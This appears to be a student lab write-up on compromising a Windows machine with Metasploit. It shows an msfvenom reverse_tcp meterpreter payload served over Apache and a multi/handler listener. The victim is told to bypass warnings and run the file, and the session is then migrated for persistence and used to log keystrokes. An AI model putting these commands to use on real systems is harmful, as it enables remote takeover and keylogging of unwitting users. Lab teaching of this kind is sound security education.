# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

![image](https://github.com/user-attachments/assets/e72bee4a-bafe-428c-86bd-e205c36b339b)


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.228.13 -f exe > fun.exe
## OUTPUT:
![image](https://github.com/user-attachments/assets/536dcded-591e-4049-9310-ef4cf66291eb)

![image](https://github.com/user-attachments/assets/22e8ce7e-4c0a-4158-9394-753281f49502)


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![image](https://github.com/user-attachments/assets/bbc3d60a-c33f-4638-91c9-bad6875863ee)

Start apache server
sudo systemctl apache2 start

![image](https://github.com/user-attachments/assets/1bb08cf4-b609-4669-be8a-bb3359d0fffd)


Invoke msfconsole:
## OUTPUT:

![image](https://github.com/user-attachments/assets/a3df1315-9ffd-4640-ace6-ad573d36de45)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


![image](https://github.com/user-attachments/assets/31e2526a-f1a7-4e5e-8aed-ae8b6e20bbed)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:
![image](https://github.com/user-attachments/assets/8a55f86b-8f54-4868-b060-e685fd5fca15)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.
![image](https://github.com/user-attachments/assets/e2820926-8f7b-4d7b-b334-50cc379a7e0e)

Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/user-attachments/assets/c15e590f-7b48-44c2-9343-8dcf7676b3dc)

On kali give the command exploit


![image](https://github.com/user-attachments/assets/64aa4ebd-2fc4-4867-9516-f9b9e1b89f45)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/user-attachments/assets/1d1ef20b-abeb-44b6-ad68-bfaa80e910af)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/user-attachments/assets/180c59ce-ac5a-4012-8c86-3524c3496a91)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/968d6a3e-d522-4719-9878-a805572f7159)

keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/4aca5645-3d30-4ee7-b86a-2d6a56e54c67)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
